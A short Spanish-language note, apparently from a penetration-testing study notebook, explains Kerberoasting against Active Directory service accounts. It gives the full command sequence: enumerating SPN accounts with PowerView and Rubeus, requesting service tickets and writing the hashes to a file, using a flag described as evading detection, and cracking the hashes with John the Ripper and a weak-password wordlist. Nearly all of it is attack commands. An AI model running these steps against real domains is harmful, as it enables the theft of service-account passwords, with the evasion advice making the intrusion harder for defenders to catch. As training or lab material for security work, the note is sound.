Este ataque va dirigido a cuentas de servicio con un *SPN (Service Principal Name)* asignado
Para poder llevar acabo este ataque es necesario conocer las credenciales de un usuario de dominio.

## Enumeración
Con PowerView podemos enumerar las cuentas que tienen un SPN
```shell
Get-DomainUser -SPN
```

También las podemos enumerar los usuarios kerberoasteables usando *Rubeus.exe*
```shell
Rubeus.exe kerberoast /stats
```
## Explotación
Una vez con los usuarios identificados solicitaremos el *TGS (Ticket Granting Service)*
```shell
Ruebus.exe kerberoast /user:<user> /simple
```

En caso de querer evadir las detecciones usaremos el para metro `/rc4opsec` al final del comando
Si queremos realizar la *enumeración* y *explotación* en un solo comando
```shell
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
```

Una vez con todos los hashes usaremos *John* para descifrarlos
```shell
john.exe --wordlist=C:\AD\Tools\Kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```
